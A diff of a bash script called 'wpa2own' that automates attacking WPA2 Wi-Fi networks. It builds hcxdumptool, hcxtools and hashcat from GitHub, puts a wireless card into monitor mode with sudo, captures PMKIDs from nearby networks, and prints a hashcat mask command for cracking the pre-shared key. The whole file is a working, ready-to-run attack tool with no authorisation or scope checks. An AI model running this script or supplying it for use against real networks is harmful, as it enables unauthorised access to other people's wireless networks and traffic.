@@ -2,83 +2,195 @@
 
 # wpa2own (see README.md for details, usage, gotchas and license)
 
-if [ ! -d "bin" ]; then mkdir bin; fi
-if [ ! -d "out" ]; then mkdir out; fi
-if [ ! -d "src" ]; then mkdir src; fi
+set -e
 
-if [ ! -f "bin/hcxdumptool" ]; then
-	cd src
-	curl -L https://github.com/ZerBea/hcxdumptool/archive/4.2.1.tar.gz | tar zx 
-	cd hcxdumptool-*
-	make
-	mv hcxdumptool ../../bin/
-	cd ../..
-fi
-
-if [ ! -f "bin/hashcat-legacy" ]; then
-	cd src
-	if [ ! -d "hashcat-legacy" ]; then
-		git clone https://github.com/hashcat/hashcat-legacy.git
-	fi
-	cd hashcat-legacy
-#	sudo ./tools/deps.sh
-	make linux64
-	mv hashcat-cli64.bin ../../bin/hashcat-legacy
-	cd ../..
-fi
-
-if [ ! -f "bin/hashcat" ]; then
-	cd src
-	if [ ! -d "hashcat" ]; then
-		git clone https://github.com/hashcat/hashcat.git
-	fi
-	cd hashcat
-	git submodule update --init
-	make
-	mv hashcat ../../bin/
-	cd ../..
-fi
-
-if [ ! -f "bin/hcxpcaptool" ]; then
-	cd src
-	curl -L https://github.com/ZerBea/hcxtools/archive/4.2.1.tar.gz | tar zx 
-	cd hcxtools-*
-	make
- 	mv hcxpcaptool hcxhashcattool wlanhc2hcx wlanwkp2hcx wlanhcxinfo wlanhcx2cap wlanhcx2essid wlanhcx2ssid wlanhcxmnc wlanhashhcx wlanhcxcat wlanpmk2hcx wlanjohn2hcx wlancow2hcxpmk whoismac wlanhcx2john wlanhcx2psk wlancap2wpasec ../../bin
-	cd ../..
-fi
-
-chmod a+x bin/*
-
-# this will guess a network interface to use, if this fails, you might have to hardcode this like:
-#my_interface="wlan0"
-my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
-
-# turn on monitor mode - again, your networking interface must support monitor mode
-# if it doesn't, this will fail, and everything else will too :(
-sudo ip link set $my_interface down
-sudo iw dev $my_interface set type monitor
-#sudo rfkill unblock all
-sudo ip link set $my_interface up
-
-# clear existing pcap if found
-#if [ ! -f "out/$timestamp.pcapng" ]; then rm -f out/$timestamp.pcapng; fi
-
+# variables
+#pcap_max_size=$()
 timestamp=$(date +%s)
+this_arch=$(arch)
+this_uname=$(uname)
 
-# run hcxdumptool to capture traffic, build a pcap
-echo "** you may need to run this for 10 minute, look for the message [FOUND PMKID] then ctrl-c **"
-cd out
-# TODO create filterlist 
-#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
-sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
-../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
+function rainbowsh(){
+	#  Copyright 2013 Manuel Gutierrez <dhunterkde@gmail.com>
+	#  https://github.com/xr09/rainbow.sh
+	#  Bash helper functions to put colors on your scripts
+	#
+	#  Usage example:
+	#  vargreen=$(echogreen "Grass is green")
+	#  echo "Coming next: $vargreen"
+	#
+	__RAINBOWPALETTE="1"
+	function __colortext()
+	{
+  	  echo -e " \e[$__RAINBOWPALETTE;$2m$1\e[0m"
+	}
+	function echogreen()
+	{
+	  echo $(__colortext "$1" "32")
+	}
+	function echored()
+	{
+  	  echo $(__colortext "$1" "31")
+	}
+	function echoblue()
+	{
+  	  echo $(__colortext "$1" "34")
+	}
+	function echopurple()
+	{
+  	  echo $(__colortext "$1" "35")
+	}
+	function echoyellow()
+	{
+	  echo $(__colortext "$1" "33")
+	}
+	function echocyan()
+	{
+	  echo $(__colortext "$1" "36")
+	}
+}
 
-exit 0
+function rainbowsh_prompt(){
+	# A status prompt scheme I created using the above rainbowsh project
+	prompt_open=$(echocyan "[")
+	prompt_action=$(echopurple ">>>")
+	prompt_info=$(echoyellow "---")
+	prompt_close=$(echocyan "]")
+	prompt_startstatus=$(echogreen "run")
+	prompt_errorstatus=$(echored "!!!")
+	prompt_endstatus=$(echogreen "end")
+        
+	prompt_start="$prompt_open $prompt_startstatus $prompt_close"
+	prompt_verb="$prompt_open $prompt_action $prompt_close"
+	prompt_adj="$prompt_open $prompt_info $prompt_close"
+	prompt_error="$prompt_open $prompt_errorstatus $prompt_close"
+	prompt_end="$prompt_open $prompt_endstatus $prompt_close"
+}
 
-echo "** using hashcat to try and get the WPA PSK **"
-../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
 
-# or ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
+function stage1-config(){
+	echo "$prompt_adj" "  - verifying base directories"
+	if [ ! -d "bin" ]; then mkdir bin; fi
+	if [ ! -d "out" ]; then mkdir out; fi
+	if [ ! -d "src" ]; then mkdir src; fi
+
+	echo "$prompt_adj" "  - verifying needed software"
+	if [ ! -f "bin/hcxdumptool" ]; then
+		echo "$prompt_adj" "      installing hcxdumptool"
+		cd src
+		curl -L https://github.com/ZerBea/hcxdumptool/archive/4.2.1.tar.gz | tar zx 
+		cd hcxdumptool-*
+		make
+		mv hcxdumptool ../../bin/
+		cd ../..
+	fi
+
+	#if [ ! -f "bin/hashcat-legacy" ]; then
+	#	echo "$prompt_adj" "      installing hashcat-legacy"
+	#	cd src
+	#	if [ ! -d "hashcat-legacy" ]; then
+	#		git clone https://github.com/hashcat/hashcat-legacy.git
+	#	fi
+	#	cd hashcat-legacy
+	#	#sudo ./tools/deps.sh
+	#	make linux64
+	#	mv hashcat-cli64.bin ../../bin/hashcat-legacy
+	#	cd ../..
+	#fi
+
+	if [ ! -f "bin/hashcat" ]; then
+		echo "$prompt_adj" "      installing hashcat"
+		cd src
+		if [ ! -d "hashcat" ]; then
+			git clone https://github.com/hashcat/hashcat.git
+		fi
+		cd hashcat
+		git submodule update --init
+		make
+		mv hashcat ../../bin/
+		cd ../..
+	fi
+
+	if [ ! -f "bin/hcxpcaptool" ]; then
+		echo "$prompt_adj" "      installing hcxpcaptool"
+		cd src
+		curl -L https://github.com/ZerBea/hcxtools/archive/4.2.1.tar.gz | tar zx 
+		cd hcxtools-*
+		make
+ 		mv hcxpcaptool hcxhashcattool wlanhc2hcx wlanwkp2hcx wlanhcxinfo wlanhcx2cap wlanhcx2essid wlanhcx2ssid wlanhcxmnc wlanhashhcx wlanhcxcat wlanpmk2hcx wlanjohn2hcx wlancow2hcxpmk whoismac wlanhcx2john wlanhcx2psk wlancap2wpasec ../../bin
+		cd ../..
+	fi
+	chmod a+x bin/*
+}
+
+function stage2-capture(){
+	# this will guess a network interface to use, if this fails, you might have to hardcode this like:
+	#my_interface="wlan0"
+
+	#TODO maybe use iwconfig to guess wireless nic?
+	my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
+
+	# turn on monitor mode - again, your networking interface must support monitor mode
+	# if it doesn't, this will fail, and everything else will too :(
+	sudo ip link set $my_interface down
+	sudo iw dev $my_interface set type monitor
+	#sudo rfkill unblock all
+	sudo ip link set $my_interface up
+
+	# clear existing pcap if found
+	#if [ ! -f "out/$timestamp.pcapng" ]; then rm -f out/$timestamp.pcapng; fi
+	echo "$prompt_adj" "  - running package capture on interface $my_interface"
+
+	# run hcxdumptool to capture traffic, build a pcap
+	echo "** you may need to run this for 10 minute, look for the message [FOUND PMKID] then ctrl-c **"
+	cd out
+	# TODO create filterlist 
+	#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
+	sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
+	#../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
+}
+
+function stage3-crack(){
+	echo "$prompt_adj" "  - transfer file $timestamp.pcapng to GPU rig for cracking"
+	#echo "** using hashcat to try and get the WPA PSK **"
+	#echo "$prompt_adj" "  - running hashcat across package capture file"
+	#../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
+	# or ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
+	echo "$prompt_adj" "  - then run: ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'"
+	
+}
+
+
+# Run output prompt functions
+rainbowsh
+rainbowsh_prompt
+echo "$prompt_start"
+
+echo "$prompt_verb" "System check"
+
+if [ $this_uname != "Linux" ]; then
+	echo "$prompt_error" "  Error: this script only supports Linux"
+	echo "$prompt_end"
+	exit 1
+else
+	echo "$prompt_adj" "  $this_uname: supported"
+
+fi
+
+if [ $this_arch != "x86_64" ]; then
+	echo "$prompt_error" "  Error: this script only supports 64bit (x86_64) Linux"
+	echo "$prompt_end"
+	exit 1
+else
+	echo "$prompt_adj" "  $this_arch: supported"
+fi
+
+echo "$prompt_verb" "Stage 1/3"
+stage1-config
+echo "$prompt_verb" "Stage 2/3"
+stage2-capture
+echo "$prompt_verb" "Stage 3/3"
+stage3-crack
+echo "$prompt_end"
 
 exit 0
